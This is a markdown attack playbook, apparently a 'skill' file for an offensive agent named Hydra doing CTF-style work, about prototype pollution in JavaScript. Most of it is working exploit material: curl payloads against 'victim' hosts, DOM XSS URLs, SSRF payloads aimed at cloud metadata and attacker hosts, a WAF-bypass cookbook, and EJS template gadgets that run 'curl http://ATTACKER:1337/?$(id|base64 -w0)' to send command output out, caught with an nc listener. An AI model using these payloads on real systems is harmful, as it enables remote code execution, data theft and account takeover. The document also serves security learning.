# Prototype Pollution

If the server or client deep-merges user JSON into an object, you have a write-to-any-attribute primitive. JavaScript objects inherit from `Object.prototype` — set `Object.prototype.x = "y"` once, and every object on the heap now has `.x = "y"` unless it explicitly overrode the field. That's the whole bug. The hard part isn't pollution itself; it's finding the **sink** that later reads the polluted attribute as if it were a trusted default — a template engine option, a spawned-child env field, a `fetch` header, a DOM property. Split your work into three phases: (1) confirm pollution works, (2) enumerate sinks, (3) chain one sink to RCE / XSS / SSRF. Shell-first: a single `curl -d '{"__proto__":{"polluted":"yes"}}'` plus a second `curl` to any GET endpoint tells you if you're in business.

## Layer 0 — Spot the sink in source

Static indicators when you have code. The dangerous patterns are **recursive merges** (the walker descends into `__proto__`) — not shallow copies:

```bash
# Classic library sinks
grep -rnE '_\.(merge|mergeWith|defaultsDeep|set|setWith|update|updateWith|zipObjectDeep)\s*\(' .
grep -rnE 'jQuery\.extend\s*\(\s*true|\$\.extend\s*\(\s*true' .
grep -rnE 'mixin-deep|merge-deep|deepmerge|defaults-deep|hoek\.merge|hoek\.applyToDefaults' .
grep -rnE 'set-value|set-in|deep-set|deep-assign|dot-prop|object-path' .
grep -rnE 'jsonpointer|flat\s*\(|flat\.unflatten|minimist|yargs-parser' .
grep -rnE 'qs\.parse|querystring\.parse|body-parser.*extended' .

# Hand-rolled merges (the silent killer — no version check saves you)
grep -rnE 'for\s*\(\s*(var|let|const)?\s*\w+\s+in\s+' --include='*.js' -A3 | grep -B1 '\[.*\]\s*='
grep -rnE 'Object\.assign\s*\([^{]' .              # Object.assign(existing, user) — target gets polluted
grep -rnE 'Object\.create\s*\(\s*null' .           # NEGATIVE indicator — safe map
```

Vulnerable-library cheat sheet:

| Library | Safe version | CVE / note |
|---|---|---|
| `lodash` | ≥ 4.17.21 | CVE-2020-8203 (`zipObjectDeep`), CVE-2019-10744 (`defaultsDeep`), CVE-2019-1010266 |
| `jquery` | ≥ 3.4.0 | `$.extend(true, {}, user)` — CVE-2019-11358 |
| `minimist` | ≥ 1.2.6 | CVE-2020-7598, CVE-2021-44906 — argv `--__proto__.x=1` |
| `yargs-parser` | ≥ 13.1.2 | CVE-2020-7608 |
| `mixin-deep` | ≥ 1.3.2 / 2.0.1 | CVE-2019-10746 |
| `merge` | ≥ 2.1.1 | CVE-2020-28498 |
| `set-value` | ≥ 4.0.1 / 3.0.3 | CVE-2019-10747 |
| `deep-set` | all affected | hand-rolled, no patch |
| `dot-prop` | ≥ 5.1.1 | CVE-2020-8116 |
| `json-ptr` / `jsonpointer` | ≥ 5.0.0 | CVE-2021-23820 |
| `hoek` (old hapi) | ≥ 4.2.1 / 5.0.3 | CVE-2018-3728 |
| `mongoose` | varies | CVE-2024-53900 (server-side `$where`) |
| `axios` | ≥ 1.7.4 | CVE-2024-39338 (SSRF via pollution) |
| `ejs` | any (see Layer 4) | not a CVE but a gadget class |
| `mongoose`/`bson` old versions | varies | `_bsontype` pollution |

Check `package.json` + `package-lock.json` first:

```bash
jq -r '.dependencies, .devDependencies | to_entries[] | "\(.key) \(.value)"' package.json
npm ls lodash minimist jquery yargs-parser mixin-deep set-value dot-prop 2>/dev/null
# On a live Node app:
curl -s https://victim/ -o /dev/null -D- | grep -i x-powered-by
# In dev mode, many apps expose /debug or /_status with module versions
```

Sink grep for the **read side** (what pollution might affect):

```bash
# Template / view rendering
grep -rnE 'res\.render|app\.render|ejs\.render|handlebars\.|mustache\.|pug\.render|nunjucks\.' .
# Spawned children (env/shell/cwd inheritance)
grep -rnE 'child_process|\bexec\s*\(|\bexecSync\s*\(|\bspawn\s*\(|\bspawnSync\s*\(|\bfork\s*\(' .
# HTTP clients (header/agent/baseURL merge)
grep -rnE 'axios\.|node-fetch|got\.|request\.|superagent\.|undici' .
# DOM sinks (client-side pollution)
grep -rnE 'innerHTML|outerHTML|insertAdjacentHTML|document\.write|\beval\s*\(|setTimeout\s*\(\s*["\x27]' .
```

## Layer 1 — Black-box detect

Single round trip. Send the payload, then probe any GET endpoint that returns JSON or HTML:

```bash
# Server-side canary — pollute then read any endpoint
curl -sX POST https://victim/api/config \
     -H 'Content-Type: application/json' \
     -d '{"__proto__":{"polluted":"canary-1337"}}'

# Read back — look for 'polluted' or 'canary-1337' anywhere in the response.
# Any object not explicitly overriding .polluted now answers "canary-1337".
curl -s https://victim/api/status | jq .
curl -s https://victim/api/anything | grep -i canary
```

Variant keys to try in order:

```json
{"__proto__":{"polluted":"yes"}}
{"constructor":{"prototype":{"polluted":"yes"}}}
{"__proto__":{"__proto__":{"polluted":"yes"}}}
```

Express query-string form (when body is filtered):

```bash
# qs library (express default, extended=true) flattens [x][y]=z into nested objects
curl -sG 'https://victim/api/anything' --data-urlencode '__proto__[polluted]=yes'
curl -sG 'https://victim/api/anything' --data-urlencode 'constructor[prototype][polluted]=yes'
```

Multipart form:

```bash
curl -sX POST https://victim/upload -F '__proto__[polluted]=yes' -F 'file=@x'
```

Dot-path libraries (`lodash.set`, `dot-prop`):

```json
{"path":"__proto__.polluted","value":"yes"}
{"path":"constructor.prototype.polluted","value":"yes"}
```

**Nested probe** — defeats shallow blacklists that only compare key === `__proto__` without recursion:

```bash
curl -sX POST https://victim/api/merge \
     -d '{"a":{"__proto__":{"polluted":"yes"}}}'
```

**toString probe** — definitive test, no reflection needed. Pollute `toString`, then trigger any code path that string-concats an object (`express` error renderer, `JSON.stringify` on circular objects, logger formatters):

```bash
curl -sX POST https://victim/api/merge \
     -d '{"__proto__":{"toString":{"x":1}}}'
# Now hit any endpoint that might cast an object to string:
curl -s 'https://victim/?x=' | head   # often triggers unhandled error → 500 body leaks
```

If the server starts throwing `TypeError: Cannot convert object to primitive value` on unrelated endpoints, you polluted `toString`. That's proof.

**Status-code probe** — pollute `status`/`statusCode`:

```bash
curl -sX POST https://victim/api/merge -d '{"__proto__":{"statusCode":510}}'
curl -sI https://victim/notfound                      # baseline: expect 404
# If 404 → 510, pollution works AND affects response-construction
```

Client-side detect (JS in browser console or via playwright):

```javascript
// After sending pollution payload
Object.prototype.polluted === "yes"          // true → client polluted
({}).polluted                                // "yes"
```

## Layer 2 — Pollution to XSS (client-side)

PortSwigger's client-side research catalogs ~15 gadget classes. The common move: a library reads a config option that defaults to a polluted attribute, and the option feeds straight into `innerHTML` / `script src` / DOM eval.

### Hash/query source to sink

Client-side pollution usually comes from the URL. Common source parsers that don't guard prototypes: `jQuery.parseParam`, custom `#foo=bar&baz=qux` readers, `URLSearchParams` routed through a merge.

```
https://victim/#__proto__[innerHTML]=<img src=x onerror=alert(1)>
https://victim/#constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>
https://victim/?__proto__[src]=data:,alert(1)
```

### Sink gadgets

| Polluted key | Sink library / pattern | Outcome |
|---|---|---|
| `src` | `$.getScript(opts)` defaults to reading `opts.src` | loads attacker JS |
| `innerHTML` / `template` | Mustache partials, some Handlebars setups, `lit-html` older versions | DOM XSS |
| `onerror` / `onload` | any `createElement('img')` path that doesn't set these explicitly | XSS on image error |
| `url` / `baseUrl` | `fetch`/`axios` defaults | redirected fetch, CORS leak |
| `style` / `hrefTemplate` | templating frameworks | attribute injection |
| `validator` / `sanitizer` | DOMPurify options merge | bypass sanitizer |
| `prototype` on custom elements | Custom Element `extends` fields | constructor hijack |
| `handler` / `success` / `error` | jQuery.ajax, Backbone views | arbitrary callback |

Trigger pattern — pollute before the library reads:

```javascript
// Example: jQuery getScript reads opts.src from prototype when unset
Object.prototype.src = 'https://attacker.example/pwn.js';
$.getScript({});     // loads attacker JS — XSS
```

### Playwright to verify

Hydra's image ships playwright chromium. Always verify a client-side chain locally against a minimal repro before firing at the target — faster feedback than blind hashing against prod:

```python
# /workspace/work/pp_verify.py
from playwright.sync_api import sync_playwright
import http.server, threading, socketserver, os

os.makedirs('/tmp/pp', exist_ok=True)
open('/tmp/pp/index.html','w').write(open('target_snapshot.html').read())
srv = socketserver.TCPServer(('127.0.0.1',8765), http.server.SimpleHTTPRequestHandler)
threading.Thread(target=srv.serve_forever, daemon=True).start()

with sync_playwright() as p:
    b = p.chromium.launch()
    pg = b.new_page()
    pg.on('pageerror', print)
    pg.on('console', lambda m: print('console', m.text))
    pg.goto('http://127.0.0.1:8765/index.html#__proto__[innerHTML]=<img src=x onerror=alert(document.domain)>')
    pg.wait_for_timeout(1500)
    b.close()
```

Dialog listener (`pg.on('dialog', ...)`) confirms alert fired. Use this to iterate gadget candidates in seconds.

Citation: [PortSwigger — Client-side prototype pollution](https://portswigger.net/research/client-side-prototype-pollution), [Gareth Heyes — *Widespread prototype pollution gadgets*](https://portswigger.net/research/widespread-prototype-pollution-gadgets).

## Layer 3 — Pollution to SSRF

Modern HTTP clients merge a default-options object per request. Pollute the default; next request inherits your fields.

### axios (pre-1.7.4)

Pollution of `Object.prototype.headers` or `Object.prototype.baseURL` affects config merge:

```json
{"__proto__":{"baseURL":"http://attacker/"}}
{"__proto__":{"headers":{"X-Forwarded-For":"127.0.0.1"}}}
{"__proto__":{"proxy":{"host":"attacker.example","port":80}}}
```

Subsequent `axios.get('/api/...')` routes through the polluted `baseURL` — fetches `http://attacker/api/...` instead. CVE-2024-39338.

### node-fetch / got / undici

`agent` field is polluted → your attacker-controlled agent intercepts the socket. `headers` field merge → inject `Host:` to pivot virtual hosts, `Authorization:` to bypass auth, or `X-Forwarded-For:127.0.0.1` for SSRF filter bypass.

```json
{"__proto__":{"hostname":"127.0.0.1"}}
{"__proto__":{"host":"169.254.169.254"}}
{"__proto__":{"headers":{"Host":"internal.svc"}}}
```

### Redirect follow / protocol

Some libraries read `Object.prototype.protocol` when constructing a URL object. Pollute `protocol: "file:"` to turn `fetch('//host/path')` into a `file://` read — chain into the **LFI** skill's reads of `/etc/passwd`, `/proc/self/environ`.

Cross-reference Hydra's `skills/web/ssrf.md` once the pollution primitive gives you an arbitrary outbound request.

## Layer 4 — Pollution to RCE (the hot path)

### Gadget A — spawn options env/shell/cwd

Node's spawn family (`exec`/`execSync`/`spawn`) accepts an `options` bag: `{env, shell, cwd, stdio, uid, ...}`. If the caller passes `undefined` or omits the options, Node falls back to defaults — which includes a **merge** of `Object.prototype` in several versions of third-party spawn wrappers (`execa`, `cross-spawn` old, `sindresorhus/execa` pre-5.0). More importantly, many apps do:

```javascript
const opts = { ...defaults, ...user };   // user came from a polluted source
childProc.execSync(cmd, opts);
```

If `defaults = {}` and pollution set `Object.prototype.shell = '/tmp/pwn.sh'`, the spawn uses your shell. Plant a script via LFI / upload, then pollute:

```json
{"__proto__":{"shell":"/tmp/pwn.sh","env":{"NODE_OPTIONS":"--inspect=0.0.0.0:9229"}}}
```

The **NODE_OPTIONS trick** is the famous one. When Node forks a child (any `spawn('node', ...)` / pm2 reload / worker thread), it reads `NODE_OPTIONS` from env. Supported injection tokens:

```
NODE_OPTIONS=--require /tmp/pwn.js           # arbitrary file exec at startup
NODE_OPTIONS=--import file:///tmp/pwn.mjs    # ESM equivalent
NODE_OPTIONS=--experimental-loader=file:///tmp/pwn.mjs
```

So the chain becomes:

1. Pollute `Object.prototype.env = { NODE_OPTIONS: '--require /tmp/x.js' }`
2. Plant `/tmp/x.js` via upload/LFI/log-poison
3. Wait for any `spawn`/`fork`/worker → RCE

Citations: [Michał Bentkowski / Securitum — *Exploiting prototype pollution — RCE in Kibana*](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/), [CVE-2019-7609 write-up](https://www.elastic.co/community/security).

### Gadget B — Express template rendering (the classic CTF primitive)

Express's `res.render('view', locals)` merges `app.locals`, `res.locals`, `locals` into a single options object that gets passed to the view engine. Many engines (EJS, Pug, Handlebars) read rendering options from that bag. Pollute the right field → code execution inside the template.

**EJS** (the most common CTF gadget) — `outputFunctionName` is interpolated raw into the compiled template source string:

```json
{"__proto__":{"outputFunctionName":"x;global.process.mainModule.require('child_process').execSync('curl http://ATTACKER:1337/?$(id|base64 -w0)');v"}}
```

Classic template-injection via config. Works on every EJS < 3.1.7 and many later versions that still expose the option. Alternate field — `escapeFunction`:

```json
{"__proto__":{"client":true,"escapeFunction":"1;return global.process.mainModule.require('child_process').execSync('id').toString();","compileDebug":true}}
```

Full fire sequence:

```bash
# Step 1 — pollute
curl -sX POST https://victim/api/merge \
     -H 'Content-Type: application/json' \
     -d '{"__proto__":{"outputFunctionName":"x;global.process.mainModule.require(\"child_process\").execSync(\"curl http://ATTACKER:1337/?$(id|base64 -w0)\");v"}}'

# Step 2 — trigger any res.render() call (hit a page that renders a template)
curl -s https://victim/                              # / usually renders index.ejs
# Watch the attacker listener:
# nc -nlvp 1337
```

**Handlebars** gadget — pollute `helpers`:

```json
{"__proto__":{"helpers":{"hack":"function(){return require('child_process').execSync('id');}"}}}
```

**Pug** — `compileDebug: true`, then tamper with `self`.

Citation: [PortSwigger — Server-side prototype pollution](https://portswigger.net/research/server-side-prototype-pollution), [Snyk — *Blitar / EJS prototype pollution gadget*](https://snyk.io/blog/prototype-pollution-exploiting-defaults/).

### Gadget C — require-cache / main module hijack

Pollute `Object.prototype.main` or `Object.prototype.exports` on apps that use custom require hooks (`require-in-the-middle`, `pirates`, `proxyquire`, NYC coverage). Less reliable but pops sandboxed environments.

### Gadget D — Mongoose / ORM

```json
{"__proto__":{"$where":"this.username == this.password || sleep(5000)"}}
```

Mongoose below the fix merges `$where` into queries from request body in some versions (CVE-2024-53900). Result: server-side JS execution inside MongoDB.

### Real-world chains for pattern-matching

- **Kibana** (CVE-2019-7609) — pollution → NODE_OPTIONS via Timelion
- **NodeBB** — repeated prototype-pollution CVEs through `nconf` / `utils.merge`
- **Jira Server** — commonly pollution → template → RCE via Velocity context bleed
- **Parse Server** (CVE-2022-39396 + successors) — pollution via REST API into MongoDB query
- **Blitz.js / Next.js** — client-side pollution through hydration config

## Layer 5 — Server-side vs client-side

| Axis | Server-side | Client-side |
|---|---|---|
| Source | HTTP body (JSON/form), query string | URL hash/search, postMessage, stored fields rendered into JS |
| Sink | Template engine, spawned child, HTTP client | `innerHTML`, script `src`, DOM handlers |
| Payoff | RCE, SSRF, auth bypass | XSS, account takeover |
| Detect | POST `__proto__`, GET any endpoint, look for field | Set URL hash, check `Object.prototype.x` in console |
| Tools | curl, ffuf | playwright, DOM Invader |

Both can coexist in one app: user-controlled config → stored in Mongo → served back as `window.__APP_CONFIG__` → merged on client. Detect both ends.

## Bypass cookbook

Order: most-likely-works → last-resort.

| Bypass | Example | Why |
|---|---|---|
| `constructor.prototype` | `{"constructor":{"prototype":{"x":1}}}` | Filter only checks `__proto__` literal |
| Nested proto | `{"a":{"__proto__":{"x":1}}}` | Shallow key-check fails on nested merge |
| Dotted path | `"__proto__.x"` then pollution via `lodash.set(k,v)` | Dotpath libs walk through `__proto__` |
| Query-string flattening | `?__proto__[x]=1` | Express `extended=true` routes to qs |
| Array form | `?__proto__[]=x` | Some flatteners drop `[]` to same key |
| Multipart | `-F '__proto__[x]=y'` | body-parser-multipart may merge into form object |
| Unicode in key | `{"\u005f\u005fproto\u005f\u005f":{...}}` | Rare — JSON decoder normalizes, but some string filters miss |
| `JSON.parse` reviver gap | Payload re-parsed after validator | Second parse reintroduces prototype keys |
| Split payload | `field=__proto__&value=x` | When app does `obj[field]=value` without key validation |
| `prototype` direct on ctor | `{"constructor":{"prototype":{...}}}` | Equivalent; some filters only block `__proto__` |
| Form-urlencoded | `__proto__%5Bx%5D=y` | Same as `?[x]=y` but via POST body |
| Case variants | `__Proto__` | Usually no help — JSON key case-sensitive — but try |

**Express `extended` flag matters**:
- `extended=false` → `querystring` module → `?a[b]=1` yields `{"a[b]":"1"}` (flat, no pollution)
- `extended=true` (default) → `qs` module → yields `{"a":{"b":"1"}}` (nested, pollutable)

Grep the code: `bodyParser.urlencoded({extended: true})` and `app.use(express.urlencoded({extended: true}))` are both exploitable sources.

## Tools in Hydra image

- **curl** + **jq** — primary payload shipping + response inspection.
- **python3** — craft nested/obfuscated JSON payloads, drive playwright.
- **playwright (chromium)** — confirm client-side gadgets locally before firing at victim. Pattern from `skills/web/ssrf.md` applies identically.
- **ffuf** — fuzz sink endpoints + parameter discovery:
  ```bash
  ffuf -u 'https://victim/api/FUZZ' \
       -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt \
       -mc 200,500 -X POST -H 'Content-Type: application/json' \
       -d '{"__proto__":{"polluted":"canary"}}'
  ```
- **node** (v22 via NodeSource) — local REPL to verify the pollution primitive and gadget:
  ```bash
  node -e 'const _=require("lodash");let o={};_.merge(o,JSON.parse(process.argv[1]));console.log(({}).polluted);' \
       '{"__proto__":{"polluted":"yes"}}'
  # → "yes"  confirms lodash.merge prototype pollution
  ```

## Install on demand

```bash
# ppmap — URL-based scanner for client-side pp
npm i -g @kleiton0x00/ppmap
ppmap -u 'https://victim/#__proto__[foo]=bar'

# ppfuzz — CLI param fuzzer
go install github.com/dwisiswant0/ppfuzz@latest
ppfuzz -l urls.txt

# PPScan — headless chromium scanner
git clone https://github.com/msrkp/PPScan /tmp/ppscan
(cd /tmp/ppscan && npm i && node index.js https://victim/)
```

Browser-side: [Burp DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) auto-detects client-side pollution; no equivalent works as well headless.

## Common traps

- **`Object.assign(a, user)` alone is safe.** It copies own-enumerable properties — doesn't walk `__proto__`. `Object.assign({}, a, user)` is also safe. The dangerous pattern is the **recursive descent** (`_.merge`, `jQuery.extend(true, …)`, hand-rolled `for (k in src) dst[k] = walk(src[k])`).
- **React / Vue / Angular apps are usually safe** — they build state through `Object.create(null)` or frozen objects. Client-side pollution works through third-party utility libraries (lodash, jQuery legacy, config parsers), not the framework core.
- **Modern lodash (≥ 4.17.21)** patched the three main CVEs. Always `cat package-lock.json | grep '"lodash"' -A1` before assuming it works — a polluted-looking endpoint on patched lodash is wasted time.
- **`--disable-proto=throw`** (Node 12+ flag) makes any access to `__proto__` throw — check `process.execArgv` via any info-leak endpoint.
- **`Object.freeze(Object.prototype)`** (added in app startup) makes assignment silently fail in non-strict mode and throw in strict. Probe: pollute, then confirm the attribute actually appears on `({}).polluted` — if the server reflects but internal objects don't inherit, prototype is frozen.
- **Koa / @tinyhttp / Fastify** have patched various merge paths in their history — always check middleware versions, not just framework version.
- **`Map` / `Set` / `Object.create(null)` maps** don't inherit from `Object.prototype`. If the specific consumer of the polluted attribute uses one of those as its config store, pollution is invisible to that consumer.
- **EJS `client` + `escapeFunction` require res.render to flow through `options`** — direct `ejs.render(str, data, opts)` with explicit `opts` overrides prototype. The gadget works only when options are omitted / default.
- **Polluted properties persist until process restart** — in a long-lived Node server your pollution stays even after the request ends. Good for patience-based triggers; bad for concurrent attackers on shared infra (you may be debugging someone else's payload).
- **The sink may fire on a DIFFERENT request** than the pollution request — pollute POST `/api/merge`, then trigger the template on GET `/`. Always test cross-endpoint effects.
- **WAFs rarely catch `constructor.prototype`** — the literal `__proto__` string is easier to block.

## Shell-first workflow

1. Send one canary: `{"__proto__":{"polluted":"canary-1337"}}`.
2. `grep -r canary-1337` across every GET endpoint → confirm.
3. If confirmed, enumerate sinks — which response fields / behaviors did the canary change?
4. Pick the strongest sink class: RCE (EJS / spawn options) > SSRF (axios) > XSS (client-side).
5. Fire the matching gadget. Watch OOB callback (`nc -nlvp 1337`) for RCE confirmation.
6. On flag file path guess: `/flag`, `/flag.txt`, `/app/flag`, env vars (`node -e 'console.log(process.env)'` via the gadget).

## References

- [PortSwigger Web Security Academy — Prototype pollution](https://portswigger.net/web-security/prototype-pollution)
- [PortSwigger research — Client-side prototype pollution](https://portswigger.net/research/client-side-prototype-pollution)
- [PortSwigger research — Server-side prototype pollution](https://portswigger.net/research/server-side-prototype-pollution)
- [Gareth Heyes — *Widespread prototype pollution gadgets*](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
- [Olivier Arteau — *Prototype pollution attacks in NodeJS* (NorthSec 2018)](https://github.com/HoLyVieR/prototype-pollution-nsec18) — original research
- [BlackFan — client-side gadget catalog](https://github.com/BlackFan/client-side-prototype-pollution)
- [Securitum — *Prototype pollution RCE in Kibana (CVE-2019-7609)*](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
- [Snyk — *Exploiting defaults in EJS*](https://snyk.io/blog/prototype-pollution-exploiting-defaults/)
- [HackTricks — NodeJS __proto__ pollution](https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/)
- [PayloadsAllTheThings — Prototype Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution)
- [Synacktiv & Intigriti writeups — Node gadget chains](https://www.synacktiv.com/publications)
- [ppmap](https://github.com/kleiton0x00/ppmap) / [PPScan](https://github.com/msrkp/PPScan) / [ppfuzz](https://github.com/dwisiswant0/ppfuzz)
- Palisade arxiv 2412.02776 — shell-first CTF methodology (verify pollution primitive with a single curl before escalating)

## Stop conditions

- Canary `{"__proto__":{"polluted":"canary-1337"}}` + three bypass variants (`constructor.prototype`, nested, query-string flattening) all fail to appear in any GET response and don't alter app behavior (status codes, error messages) → prototype pollution not exploitable here. Pivot to deserialization / SSTI / JWT.
- Pollution confirmed but no sink chain lands after trying EJS `outputFunctionName`, spawn env, and axios `baseURL` → enumerate app routes with `ffuf`, read source via any LFI primitive, then targeted-gadget. If still stuck after 45 min, write `./work/postmortem.md` with the list of polluted keys tested and pivot.
- Client-side only (DOM pollution works via hash, server-side body rejected) and no meaningful DOM sink → treat as XSS-via-pollution; cross-ref the (future) XSS skill and hunt for `innerHTML`/`script src` gadgets via DOM Invader-style manual review.
- Flag recovered via EJS RCE, SSRF-to-metadata, or DOM XSS exfil → write `./flag.txt`, emit `FLAG: <flag>`, stop.
